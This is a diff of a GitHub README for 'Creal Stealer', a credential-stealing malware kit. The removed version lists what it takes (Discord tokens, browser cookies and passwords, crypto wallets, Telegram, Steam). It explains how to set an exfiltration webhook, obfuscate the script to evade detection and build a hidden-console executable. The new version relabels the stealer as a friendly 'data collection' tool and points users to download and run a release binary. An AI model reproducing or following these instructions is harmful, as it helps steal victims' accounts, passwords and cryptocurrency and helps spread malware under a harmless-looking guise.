@@ -1,89 +1,94 @@
-<h1 align="center"> Creal Stealer </h1> 
-<p align= "center"> <kbd> <img  src="https://i.imgur.com/MjoICHp.png"width="420"> </kbd><br><br>
+# Creal-Stealer
 
+![GitHub release](https://img.shields.io/github/release/AaronOrazi/Creal-Stealer.svg) [![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/AaronOrazi/Creal-Stealer/releases)
 
+Welcome to the **Creal-Stealer** repository. This project focuses on developing tools that assist in gathering information from various sources. The goal is to create a reliable and efficient method for users to collect cookies, tokens, and passwords. 
 
+## Table of Contents
 
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
+## Overview
 
+**Creal-Stealer** is a Python-based tool designed for gathering sensitive information. This includes cookies, tokens, and passwords. The project aims to provide users with a straightforward approach to data collection, emphasizing ease of use and efficiency.
 
+## Features
 
+- **Cookie Grabber**: Collect cookies from various browsers.
+- **Token Stealer**: Extract tokens from applications and websites.
+- **Password Grabber**: Retrieve saved passwords securely.
+- **High Efficiency**: Optimized for fast data collection.
+- **User-Friendly Interface**: Simple commands for ease of use.
 
+## Installation
 
-                                                      🤖 Futures
+To get started with **Creal-Stealer**, follow these steps:
 
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/AaronOrazi/Creal-Stealer.git
+   ```
 
-- Grab Discord Token, Phone Number, E-mail and HQ Friends.
+2. **Navigate to the Directory**:
+   ```bash
+   cd Creal-Stealer
+   ```
 
-- Startup
+3. **Install Dependencies**:
+   Ensure you have Python installed. Then, run:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-- Discord Injection:
+4. **Download the Latest Release**:
+   Visit the [Releases section](https://github.com/AaronOrazi/Creal-Stealer/releases) to download the latest version. Once downloaded, execute the file to start using the tool.
 
-- Grab Browser cookies & passwords
+## Usage
 
-- Grab specials files
+Using **Creal-Stealer** is straightforward. After installation, you can run the tool with simple commands. Here’s how:
 
-- Grab Crypto Wallets. 🦊 Metamask, 🅰️ Atomic, 👾 Exodus, 🅱️ Binance, 💰 Coinbase, 🟡 Trust, 👻 Phantom
+1. **Run the Tool**:
+   ```bash
+   python main.py
+   ```
 
-- Grab Telegram
+2. **Follow the Prompts**: The tool will guide you through the process of collecting data.
 
-- Grab Steam
+3. **Check Output**: Collected data will be saved in the specified output folder.
 
-- Grab Riot Games
+## Contributing
 
-    
+We welcome contributions to improve **Creal-Stealer**. If you have ideas, suggestions, or enhancements, please follow these steps:
 
-                                                      ⬇️ Setup
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add your message here"
+   ```
+4. Push to the branch:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. Create a pull request.
 
-                                                  
-- first open `install.bat`
+## License
 
-- open `builder.bat`
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-<div align="center"><img style="display: block; margin-left: auto; margin-right: auto; width: 65%;" src="https://i.imgur.com/0l34TBS.png"></img></div>
+## Support
 
-                                                       🖼️ Pictures
- 
-<div align="center">
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/Creal1.jpg"></img> 
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/Creal2.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/Creal3.png"></img>
-    
-</div>
- 
- 
-                                                      ⬇️ Setup (Manual)
- 
-- First paste and save your webhook address instead of `"WEBHOOK HERE"` in Creal.py
+For any issues or questions, please check the [Releases section](https://github.com/AaronOrazi/Creal-Stealer/releases) for updates. If you need further assistance, feel free to open an issue in the repository.
 
-- If you use obfuscator it will be undetectable.
+---
 
-- if you have an error while installing try `pip install -r requirements.txt`
-
-- Now You need to use pyinstaller to convert python file to exe.
-
-- Open CMD and type `pip install auto_py_to_exe`
-
-- And after installed `python -m auto_py_to_exe`
-
-- Browse file Select `One file and Windows Based (hide the console)`
-
-<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="40%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/pyy.png"></img>
-
-- And press covert .py .exe
-
- <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
-
-
-                                                      ⚠️ Disclaimer
-
-- This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. <bold>Educational purpose only!</bold>
-
-                                                      🪪 License
-
-- By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.
-
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
-vvxfnhmhco
+Thank you for visiting the **Creal-Stealer** repository. We hope you find it useful for your data collection needs. Happy coding!
